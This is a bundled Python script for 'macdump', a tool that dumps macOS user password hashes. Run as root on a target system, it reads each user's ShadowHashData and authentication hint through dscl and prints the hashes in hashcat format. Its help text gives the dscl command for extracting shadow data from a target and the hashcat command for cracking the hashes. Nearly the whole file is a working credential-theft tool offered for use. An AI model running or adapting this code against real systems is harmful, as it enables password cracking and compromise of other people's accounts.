#!/usr/bin/env python
import contextlib as __stickytape_contextlib

@__stickytape_contextlib.contextmanager
def __stickytape_temporary_dir():
    import tempfile
    import shutil
    dir_path = tempfile.mkdtemp()
    try:
        yield dir_path
    finally:
        shutil.rmtree(dir_path)

with __stickytape_temporary_dir() as __stickytape_working_dir:
    def __stickytape_write_module(path, contents):
        import os, os.path

        def make_package(path):
            parts = path.split("/")
            partial_path = __stickytape_working_dir
            for part in parts:
                partial_path = os.path.join(partial_path, part)
                if not os.path.exists(partial_path):
                    os.mkdir(partial_path)
                    with open(os.path.join(partial_path, "__init__.py"), "wb") as f:
                        f.write(b"\n")

        make_package(os.path.dirname(path))

        full_path = os.path.join(__stickytape_working_dir, path)
        with open(full_path, "wb") as module_file:
            module_file.write(contents)

    import sys as __stickytape_sys
    __stickytape_sys.path.insert(0, __stickytape_working_dir)

    __stickytape_write_module('macdump/__init__.py', b'__version__ = "1.0.0"\n')
    __stickytape_write_module('macdump/log.py', b'verbose = True\n\n\ndef set_quiet():\n    global verbose\n    verbose = False\n\n\ndef status(msg: str):\n    if verbose:\n        print(f"[+] {msg}")\n\n\ndef error(msg: str):\n    print(f"[!] {msg}")\n')
    __stickytape_write_module('macdump/system.py', b'import subprocess\n\nfrom macdump.log import status\nfrom macdump.shared import dump\n\ndef dump_system_hashes():\n    for user in list_system_users():\n        status(f"Dumping hash of {user}")\n\n        authentication_hint = get_authentication_hint_for(user)\n        if authentication_hint:\n            status(f"Authentication hint: {authentication_hint}")\n\n        shadow_hash_data = get_shadow_hash_data_for(user)\n        if shadow_hash_data:\n            dump(user, shadow_hash_data)\n\n\ndef list_system_users():\n    cmd = ["dscl", ".", "list", "/Users"]\n    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n\n    if process.returncode == 0 and stdout:\n        return [\n            user\n            for user in stdout.decode().split("\\n")\n            if user\n            and not user.startswith("_")\n            and user not in ["daemon", "nobody", "root"]\n        ]\n    else:\n        print(f" $ {\' \'.join(cmd)} \\n{stderr.decode()}")\n        return []\n\n\ndef get_shadow_hash_data_for(user):\n    cmd = ["dscl", ".", "-read", f"/Users/{user}", "dsAttrTypeNative:ShadowHashData"]\n    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n\n    if process.returncode == 0 and stdout:\n        return stdout.decode().split("\\n")[1]\n    else:\n        print(f" $ {\' \'.join(cmd)} \\n{stderr.decode()}")\n        return ""\n\n\ndef get_authentication_hint_for(user):\n    cmd = ["dscl", ".", "-read", f"/Users/{user}", "AuthenticationHint"]\n    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n\n    if process.returncode == 0 and stdout:\n        return stdout.decode().split("\\n")[1]\n    else:\n        if stderr.decode().strip() != "No such key: AuthenticationHint":\n            print(f" $ {\' \'.join(cmd)} \\n{stderr.decode()}")\n        return ""\n')
    __stickytape_write_module('macdump/shared.py', b'import string\nimport plistlib\n\ndef dump(user, shadow_hash_data):\n    props = to_apple_property_list(shadow_hash_data)\n    hash_data = props["SALTED-SHA512-PBKDF2"]\n\n    hashcat_hash = get_hash_pbkdf2_sha512(\n        hash_data["entropy"], hash_data["salt"], hash_data["iterations"]\n    )\n    print(f"{user}:{hashcat_hash}")\n\n\ndef to_apple_property_list(shadow_data):\n    clean_hex = "".join([c for c in shadow_data.lower() if c in string.hexdigits])\n    data = bytes.fromhex(clean_hex)\n    return plistlib.loads(data)\n\n\ndef get_hash_pbkdf2_sha512(entropy, salt, iterations):\n    return f"$ml${iterations}${salt.hex()}${entropy.hex()}"\n\n\n')
    __stickytape_write_module('macdump/file.py', b'from macdump.log import status\nfrom macdump.shared import dump\n\n\ndef dump_hash_from(data):\n    authentication_hint = extract_authentication_hint_from(data)\n    if authentication_hint:\n        status(f"Authentication hint: {authentication_hint}")\n\n    user = extract_username_from(data) or "UNKNOWN_USER"\n    shadow_hash_data = extract_shadow_hash_data_from(data)\n    dump(user, shadow_hash_data)\n\n\n# returns the line after "dsAttrTypeNative:ShadowHashData:"\ndef extract_shadow_hash_data_from(path):\n    shadow_data = extract_line_after_from(\n        path, target_line="dsAttrTypeNative:ShadowHashData:"\n    )\n    if not shadow_data:\n        raise Exception(f"Shadow hash data not found in {path}")\n\n    return shadow_data\n\n\n# returns the line after "dsAttrTypeNative:ShadowHashData:"\ndef extract_username_from(data):\n    for line in data.split("\\n"):\n        line = line.strip()\n        if line.startswith("RecordName:"):\n            return line.split(":")[1].strip()\n    return ""\n\n\n# returns the line after "AuthenticationHint:"\ndef extract_authentication_hint_from(data):\n    return extract_line_after_from(data, "AuthenticationHint:")\n\n\ndef extract_line_after_from(data, target_line):\n    return_next = False\n    for line in data.split("\\n"):\n        line = line.strip()\n        if return_next:\n            return line\n\n        if line == target_line:\n            return_next = True\n\n    return ""\n')
    import sys
    import argparse
    import getpass
    
    from macdump.log import status, error, set_quiet
    from macdump.system import dump_system_hashes
    from macdump.file import dump_hash_from
    
    def main():
        """Dump macOS 1.8+ system user hashes"""
    
        args = parse_args()
    
        if args.quiet:
            set_quiet()
    
        if not args.from_file:
            status(f"Dumping hashes of all system users")
            current_user = getpass.getuser()
            if current_user != "root":
                error(f"Running as {current_user}, but must run as root to dump hashes!")
                sys.exit(1)
    
            dump_system_hashes()
        else:
            status(f"Loading shadow hash data from {args.from_file}")
            dump_hash_from(args.from_file.read())
    
        status(
            "Put hashes into file 'hashes.txt', then crack with: hashcat -m 7100 --username hashes.txt -a 0 wordlist.txt"
        )
    
    def parse_args():
        parser = argparse.ArgumentParser(
            description="""Dump hashes for macOS 10.8+ system users in hashcat format (username:hash).
    - Use this script to on the target system to dump hashes for all system users.
      Root permissions are required. Run this script with 'sudo'.
    - Alternatively, use this script offline on a file containing the shadow hash data of a user.
      On the target system, run 'sudo dscl . -read /Users/username dsAttrTypeNative:ShadowHashData > /tmp/shd.txt',
      then copy '/tmp/shd.txt' to your system and pass the file to the '--from-file' argument.
    With hashes stored in a file, crack with: hashcat -m 7100 --username hashes.txt -a 0 wordlist.txt
    """,
            formatter_class=argparse.RawTextHelpFormatter,
        )
        parser.add_argument(
            "--from-file",
            type=argparse.FileType("r"),
            help="file with Shadow Hash Data output for offline use",
        )
        parser.add_argument(
            "-q", "--quiet", action="store_true", help="output only the hashes"
        )
    
        return parser.parse_args()
    
    if __name__ == "__main__":
        main()
    